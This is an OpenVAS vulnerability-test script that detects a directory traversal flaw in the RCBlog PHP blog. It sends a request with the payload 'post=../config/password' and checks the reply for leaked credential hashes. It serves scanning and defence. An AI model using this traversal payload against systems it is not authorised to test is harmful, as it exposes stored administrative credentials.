# OpenVAS Vulnerability Test
# $Id: rcblog_dir_transversal.nasl 3359 2016-05-19 13:40:42Z antu123 $
# Description: RCBlog post Parameter Directory Traversal Vulnerability
#
# Authors:
# Josh Zlatin-Amishav josh at ramat dot cc
# Changes by Tenable: reduced the likehood of false positives
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP script that is prone to directory 
traversal attacks.

Description :

The remote host is running RCBlog, a blog written in PHP. 

The remote version of this software fails to sanitize user-supplied
input to the 'post' parameter of the 'index.php' script.  An attacker
can use this to access arbitrary files on the remote host provided
PHP's 'magic_quotes' setting is disabled or, regardless of that
setting, files with a '.txt' extension such as those used by the
application to store administrative credentials.";

tag_solution = "Remove the application as its author no longer supports it.";

if(description)
{
  script_id(20825);
  script_version("$Revision: 3359 $");
  script_tag(name:"last_modification", value:"$Date: 2016-05-19 15:40:42 +0200 (Thu, 19 May 2016) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2006-0370", "CVE-2006-0371");
  script_bugtraq_id(16342);
  script_xref(name:"OSVDB", value:"22679");
  script_xref(name:"OSVDB", value:"22680");
  script_xref(name:"OSVDB", value:"22681");

  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  name = "RCBlog post Parameter Directory Traversal Vulnerability";
  script_name(name);

summary = "Checks for directory transversal in RCBlog index.php script";

script_summary(summary);

script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");

script_family("Web application abuses");
script_copyright("Copyright (C) 2006 Josh Zlatin-Amishav");

script_dependencies("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/422499");
exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

dirs = make_list("/rcblog", "/blog", cgi_dirs());

file = "../config/password";
foreach dir ( dirs )
{
  req = http_get(
    item:string(
      dir, "/index.php?",
      "post=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like it worked.
  if (
    string(file, " not found.</div>") >!< res &&
    'powered by <a href="http://www.fluffington.com/">RCBlog' >< res &&
    egrep(pattern:'<div class="title">[a-f0-9]{32}\t[a-f0-9]{32}</div>', string:res)
  ) {
    security_message(port);
    exit(0);
  }
}
